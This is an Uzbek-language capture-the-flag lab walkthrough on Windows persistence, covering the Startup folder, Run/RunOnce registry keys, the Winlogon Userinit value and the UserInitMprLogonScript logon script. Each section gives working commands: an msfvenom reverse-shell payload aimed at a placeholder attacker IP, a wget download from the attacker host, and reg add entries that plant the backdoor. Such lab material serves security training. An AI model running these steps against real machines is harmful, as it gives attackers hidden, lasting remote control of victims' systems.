## ✅ **1. Startup folder orqali persistence**

### 🎯 Maqsad:

Foydalanuvchi tizimga kirganda avtomatik ishlaydigan `.exe` faylni joylashtirish.

### 🧩 Izoh:

* Har bir foydalanuvchining quyidagi joyda `Startup` papkasi bor:

  ```
  C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  ```
* Bu yerga `.exe` fayl qo‘yilsa, foydalanuvchi tizimga kirganda u avtomatik ishlaydi.
* Agar barcha foydalanuvchilar uchun ishga tushishini xohlasak:

  ```
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  ```

### ⚙️ Bosqichlar:

1. Payload yaratish:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=HUJUMCHI_IP LPORT=4450 -f exe -o revshell.exe
   ```

2. Faylni serverda joylash va qurbon kompyuterda yuklab olish:

   ```bash
   python3 -m http.server
   ```

   Qurbon kompyuterda:

   ```powershell
   wget http://HUJUMCHI_IP:8000/revshell.exe -O revshell.exe
   ```

3. Faylni `Startup` papkaga nusxalash:

   ```cmd
   copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
   ```

4. Logout qilish (RDP oynasini yopish emas, **"Sign out"** qilish).

5. Qayta kirilganda shell qaytib keladi.

6. Ushbu shell orqali flagni ishga tushirish:

   ```cmd
   C:\flags\flag10.exe
   ```

---

## ✅ **2. Registry Run / RunOnce orqali persistence**

### 🧩 Registry kalitlari:

* Faqat joriy foydalanuvchi uchun:

  ```
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
  ```
* Barcha foydalanuvchilar uchun:

  ```
  HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
  ```

`Run` – har loginda ishlaydi
`RunOnce` – faqat 1 marta ishlaydi

### ⚙️ Bosqichlar:

1. Payload yaratish:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=HUJUMCHI_IP LPORT=4451 -f exe -o revshell.exe
   ```

2. Qurbon kompyuterga o‘tkazish va ko‘chirish:

   ```cmd
   move revshell.exe C:\Windows
   ```

3. Registry kalitini yaratish:

   ```powershell
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MyBackdoor /t REG_EXPAND_SZ /d "C:\Windows\revshell.exe"
   ```

4. Logout va qayta login – shell keladi.

5. Flagni ishga tushirish:

   ```cmd
   C:\flags\flag11.exe
   ```

---

## ✅ **3. Winlogon orqali persistence (Userinit key)**

### 🧩 Registry kaliti:

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

* `Userinit` odatda `C:\Windows\system32\userinit.exe`
* Biz unga `,C:\Windows\revshell.exe` qo‘shamiz — bu ikkala fayl ketma-ket ishga tushadi.

### ⚙️ Bosqichlar:

1. Payload yaratish:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=HUJUMCHI_IP LPORT=4452 -f exe -o revshell.exe
   ```

2. Qurbon kompyuterga yuklash:

   ```cmd
   move revshell.exe C:\Windows
   ```

3. Registry ni o‘zgartirish:

   ```powershell
   reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\revshell.exe" /f
   ```

4. Logout va qayta login – shell qaytadi.

5. Flagni ishga tushiring:

   ```cmd
   C:\flags\flag12.exe
   ```

---

## ✅ **4. Logon scripts orqali persistence (UserInitMprLogonScript)**

### 🧩 Qanday ishlaydi:

* Windows foydalanuvchi login qilganda, `UserInitMprLogonScript` nomli environment variable ni tekshiradi.
* Uni registry orqali yaratishimiz mumkin:

  ```
  HKCU\Environment
  ```

### ⚙️ Bosqichlar:

1. Payload yaratish:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=HUJUMCHI_IP LPORT=4453 -f exe -o revshell.exe
   ```

2. Qurbon kompyuterga yuklash:

   ```cmd
   move revshell.exe C:\Windows
   ```

3. Registry kalitini yaratish (faqat joriy foydalanuvchi uchun!):

   ```powershell
   reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\revshell.exe"
   ```

4. Logout → login → shell qaytadi.

5. Flagni ishga tushiring:

   ```cmd
   C:\flags\flag13.exe
   ```

---

## ✅ Xulosa:

| Usul                 | Qo‘llaniladigan joy | Har kim uchunmi? | Qachon ishlaydi? |
| -------------------- | ------------------- | ---------------- | ---------------- |
| Startup Folder       | Startup papkasi     | Ha/Yoq           | Har doim login   |
| Registry Run/RunOnce | HKCU yoki HKLM      | Ha               | Run → Har doim   |
| Winlogon (Userinit)  | Winlogon registry   | Ha               | Har doim login   |
| Logon Script         | HKCU\Environment    | Faqat joriy user | Har doim login   |
